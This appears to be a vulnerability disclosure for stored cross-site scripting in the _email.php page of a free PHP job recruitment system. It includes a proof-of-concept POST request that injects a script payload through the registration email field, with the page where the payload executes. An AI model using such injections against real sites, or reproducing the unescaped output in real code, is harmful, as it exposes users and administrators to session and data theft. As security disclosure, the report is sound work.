# job-recruitment-in-php has Cross Site Scripting vulnerability in _email.php

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
/_email.php

## describe

In  /_email.php, There is a cross-site scripting attack  vulnerability in Job-recruitment system. The parameter that can be controlled is: $row["email"] . A malicious attacker can obtain sensitive information about administrators.

**Code analysis** 

Select email from user_account tables, and splicing it to the $dets parameter. echo it in no filtter.

image-20241218135141210

## POC

```
POST /register.php/ HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/register.php/
Cookie: PHPSESSID=k2j8lv5uh7kjvag3t57a63276s
Upgrade-Insecure-Requests: 1
Priority: u=0, i

e=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&p1=admin123
```

![image-20241218135335134](https://github.com/user-attachments/assets/86de1987-c5e2-4cde-995e-43d4da8b2dbd)

asset the url

```
http://airecruitmentsystem/_email.php
```

**Result**

![image-20241218135309193](https://github.com/user-attachments/assets/8671b238-ede3-49f1-831e-24cddc603624)

